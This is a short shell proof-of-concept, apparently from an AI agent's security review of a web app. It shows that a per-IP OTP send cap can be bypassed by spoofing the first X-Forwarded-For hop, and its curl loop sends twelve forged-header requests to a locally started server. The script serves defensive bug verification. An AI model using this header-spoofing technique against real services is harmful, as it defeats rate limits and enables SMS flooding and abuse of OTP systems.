#!/bin/sh
# Per-IP otpsend cap (10/hr) is bypassable: lib/handler.js:289 takes
# `x-forwarded-for`.split(',')[0] as the client ip. On a real reverse proxy (including Vercel,
# whose docs say it APPENDS the real client ip to any incoming X-Forwarded-For), the trustworthy
# value is the LAST hop, not the first -- the first hop is whatever the client sent. This script
# proves it locally: one real TCP client, 12 different (spoofed) first-hop values, each paired
# with the SAME fixed "trusted proxy" tail IP a real proxy would append -- all 12 otpsend calls
# succeed (no per-IP throttling), because the server reads the spoofed value, not the tail.
# Run: sh 09-xff-spoof.sh   (uses PORT=8109, its own DATA_FILE under scratchpad/09)
set -e
SCR=/tmp/claude-0/-home-user-DHK-Predicts/40770141-c89f-5d4e-b4c8-6b95cd22e417/scratchpad/09
mkdir -p "$SCR"
PORT=8109 OTP_ENABLED=1 SMS_PROVIDER=console ADMIN_PHONES=+447700900111 DATA_FILE="$SCR/xff-data.json" \
  node /home/user/upcoming/dhk-predicts-features/app/server.js > "$SCR/xff-server.log" 2>&1 &
PID=$!
sleep 1
for i in $(seq 1 12); do
  ph=$(printf "+44770090%04d" "$i")
  curl -s -X POST localhost:8109/api/auth -H 'content-type: application/json' \
    -d "{\"mode\":\"signup\",\"phone\":\"$ph\",\"pin\":\"secret12\",\"name\":\"X$i\",\"adult\":true,\"consent\":true}" >/dev/null
done
echo "12 otpsend calls, one real client, 12 spoofed first-hop XFF values + a fixed trusted tail IP (203.0.113.9):"
for i in $(seq 1 12); do
  ph=$(printf "+44770090%04d" "$i")
  r=$(curl -s -X POST localhost:8109/api/otpsend -H 'content-type: application/json' \
    -H "x-forwarded-for: 1.2.3.$i, 203.0.113.9" -d "{\"phone\":\"$ph\"}")
  echo "spoofed-ip=1.2.3.$i -> $r"
done
kill $PID 2>/dev/null
wait $PID 2>/dev/null
